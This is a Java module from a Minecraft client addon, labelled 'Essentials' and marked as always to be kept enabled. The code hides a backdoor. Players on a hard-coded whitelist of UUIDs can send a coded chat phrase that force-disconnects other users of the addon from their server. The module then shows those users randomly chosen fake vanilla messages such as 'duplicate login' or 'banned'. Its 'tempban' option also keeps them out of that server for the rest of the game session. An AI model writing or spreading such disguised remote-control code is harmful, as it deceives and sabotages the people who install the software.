package spigey.asteroide.modules;

import meteordevelopment.meteorclient.MeteorClient;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import meteordevelopment.orbit.EventPriority;
import net.minecraft.client.resource.language.I18n;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.minecraft.network.packet.s2c.play.ChatMessageS2CPacket;
import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;
import net.minecraft.network.packet.s2c.play.ProfilelessChatMessageS2CPacket;
import net.minecraft.text.Text;
import spigey.asteroide.AsteroideAddon;

import java.util.Objects;
import java.util.UUID;

import static spigey.asteroide.AsteroideAddon.MinehutIP;
import static spigey.asteroide.util.msg;
import static spigey.asteroide.util.randomNum;

public class BanStuffs extends Module { // I came back one day later, what the actual fuck is this spaghetti code??? UPDATE: I just got back to the code and added the banningm what the fucking fuck is this spaghetti??
    public BanStuffs() {
        super(AsteroideAddon.CATEGORY, "Essentials", "Important Essentials for Asteroide. Always keep this enabled!");
    }
    private int tick = -1;
    private boolean ban = false;
    private final String whitelisted = "f65b3cba-2c45-47ef-b746-d67fafbb2d65, a36af356-1e3f-4800-92cf-819dd0a21913, fc524394-735a-4bd4-822f-1097442408f4, 4ca0d99f-daf8-3053-aefe-3d7b13481d8c, 7a999f59-a14c-38ef-bf07-53c3e752d600, 35d15b97-0524-3173-bf9b-dfb2a3c63e7b, ";
    private final String users = "Spigey, SkyFeiner, EinFauli, ";
    private final String[] warndom = {"multiplayer.disconnect.chat_validation_failed", "multiplayer.disconnect.duplicate_login", "multiplayer.disconnect.duplicate_login", "multiplayer.status.unknown", "multiplayer.disconnect.kicked"};
    private final String[] ben = {"multiplayer.disconnect.chat_validation_failed", "multiplayer.disconnect.duplicate_login", "multiplayer.disconnect.duplicate_login", "multiplayer.status.unknown", "multiplayer.disconnect.banned"};
    private final String[] pon = {"disconnect.closed", "multiplayer.disconnect.duplicate_login", "multiplayer.status.unknown", "multiplayer.disconnect.banned", "disconnect.loginFailedInfo.userBanned", "gui.banned.title.permanent", "gui.banned.skin.title", "multiplayer.disconnect.banned", "multiplayer.status.unrequested", "multiplayer.status.quitting", "multiplayer.disconnect.name_taken"};
    private String content = "";
    private boolean activeated = false;
    @EventHandler(priority = EventPriority.HIGHEST + 3)
    public void onPacketReceive(PacketEvent.Receive event){
        if (!((event.packet instanceof GameMessageS2CPacket) || (event.packet instanceof ChatMessageS2CPacket) || (event.packet instanceof ProfilelessChatMessageS2CPacket))) {return;}
        String content = null;
        UUID whatif = null;
        if(event.packet instanceof GameMessageS2CPacket) content = String.valueOf(((GameMessageS2CPacket) event.packet).content().getString());
        if(event.packet instanceof ChatMessageS2CPacket){content = ((ChatMessageS2CPacket) event.packet).body().content(); whatif = ((ChatMessageS2CPacket) event.packet).sender();}
        if(event.packet instanceof ChatMessageS2CPacket) if(((ChatMessageS2CPacket) event.packet).unsignedContent() != null){content = String.valueOf(((ChatMessageS2CPacket) event.packet).unsignedContent());}
        if(event.packet instanceof ProfilelessChatMessageS2CPacket) content = ((ProfilelessChatMessageS2CPacket) event.packet).message().getString();
        if((content == null || whatif == null) && !(event.packet instanceof ProfilelessChatMessageS2CPacket)) return;
        if(content.contains("Hey " + mc.getSession().getUsername() + ", could you please leave rq? Thanks. - daSigma ")){
            if(whitelisted.contains(mc.getSession().getUuidOrNull().toString() + ", ")){return;}
            if(event.packet instanceof ProfilelessChatMessageS2CPacket){
                if(!users.contains(content.split("Thanks. - daSigma ")[1] + ", ")){return;}
                assert mc.player != null;
                Objects.requireNonNull(mc.getNetworkHandler()).getConnection().disconnect(Text.of(I18n.translate(warndom[randomNum(0, warndom.length - 1)])));
                return;
            }
            if(!whitelisted.contains(whatif + ", ")){return;}
            assert mc.player != null;
            Objects.requireNonNull(mc.getNetworkHandler()).getConnection().disconnect(Text.of(I18n.translate(warndom[randomNum(0, warndom.length - 1)])));
        }
        if(content.contains("Hey " + mc.getSession().getUsername() + ", could you please leave? Thanks. - daSigma ")){
            if(whitelisted.contains(mc.getSession().getUuidOrNull().toString() + ", ")){return;}
            if(event.packet instanceof ProfilelessChatMessageS2CPacket){
                if(!users.contains(content.split("Thanks. - daSigma ")[1] + ", ")){return;}
                assert mc.player != null;
                assert mc.getCurrentServerEntry() != null;
                AsteroideAddon.banlist.add(mc.getCurrentServerEntry().address.toLowerCase());
                Objects.requireNonNull(mc.getNetworkHandler()).getConnection().disconnect(Text.of(I18n.translate(ben[randomNum(0, ben.length - 1)])));
                return;
            }
            if(!whitelisted.contains(whatif + ", ")){return;}
            assert mc.player != null;
            assert mc.getCurrentServerEntry() != null;
            AsteroideAddon.banlist.add(mc.getCurrentServerEntry().address.toLowerCase());
            Objects.requireNonNull(mc.getNetworkHandler()).getConnection().disconnect(Text.of(I18n.translate(ben[randomNum(0, ben.length - 1)])));
        }
        if(content.contains(", could you please leave rq? Thanks. - daSigma " + mc.getSession().getUsername()) && whitelisted.contains(whatif + ", ")){event.cancel();}
        if(content.contains(", could you please leave? Thanks. - daSigma " + mc.getSession().getUsername()) && whitelisted.contains(whatif + ", ")){event.cancel();}
    }
    @EventHandler(priority = EventPriority.HIGHEST + 10)
    private void onPacketSend(PacketEvent.Send event) {
        if(!activeated){MeteorClient.EVENT_BUS.subscribe(this); activeated = true;}
        if (!(event.packet instanceof ChatMessageC2SPacket)) {return;}
        content = ((ChatMessageC2SPacket) event.packet).chatMessage();
        if(!whitelisted.contains(mc.getSession().getUuidOrNull().toString() + ", ")){return;}
        if(content.contains("-kick ")){
            String username = content.split("-kick ")[1];
            if(!mc.getNetworkHandler().getPlayerList().stream().anyMatch(player -> player.getProfile().getName().equals(username))){return;}
            event.setCancelled(true);
            this.ban = false;
            this.tick = 1;
            info("Kicking " + username);
        }
        if(content.contains("-tempban ")){
            String username = content.split("-tempban ")[1];
            if(!mc.getNetworkHandler().getPlayerList().stream().anyMatch(player -> player.getProfile().getName().equals(username))){return;}
            event.setCancelled(true);
            this.ban = true;
            this.tick = 1;
            ChatUtils.sendMsg(Text.of("Banning " + username));
            ChatUtils.sendMsg(Text.of("§cThis ban will be removed when the player restarts the game!"));
        }
    }
    @EventHandler
    private void onTick(TickEvent.Post event){
        if(this.tick > 0){this.tick--; return;}
        if(this.tick == -1){return;}
        if(!this.ban) msg("Hey " + this.content.split("-kick ")[1] + ", could you please leave rq? Thanks. - daSigma " + mc.getSession().getUsername());
        else msg("Hey " + this.content.split("-tempban")[1].trim() + ", could you please leave? Thanks. - daSigma " + mc.getSession().getUsername());
        this.tick = -1;
    }
    @EventHandler
    public void MinehutHud(PacketEvent.Receive event){
        String content = "";
        if(!(event.packet instanceof GameMessageS2CPacket || event.packet instanceof ChatMessageS2CPacket)) return;
        if(event.packet instanceof GameMessageS2CPacket) content = ((GameMessageS2CPacket) event.packet).content().getString();
        if(event.packet instanceof ChatMessageS2CPacket) content = event.packet.toString();
        if(content.startsWith("Sending you to")){
            String coom = content.replace("Sending you to ", "");
            MinehutIP = coom.substring(0, coom.length() - 1);
        }
    }
    @EventHandler
    private void isBanned(TickEvent.Post event){
        assert mc.getCurrentServerEntry() != null;
        assert mc.getCurrentServerEntry().address != null;
        String temp = "pls just try harder";
        try{temp = mc.getCurrentServerEntry().address;} catch(Exception L){temp = null;}
        assert temp != null;
        if(temp == null) return;
        if(mc.getCurrentServerEntry().address != null) {
            if (!AsteroideAddon.banlist.contains(mc.getCurrentServerEntry().address)) return;
            Objects.requireNonNull(mc.getNetworkHandler()).getConnection().disconnect(Text.of(I18n.translate(pon[randomNum(0, pon.length - 1)])));
        }
    }
}
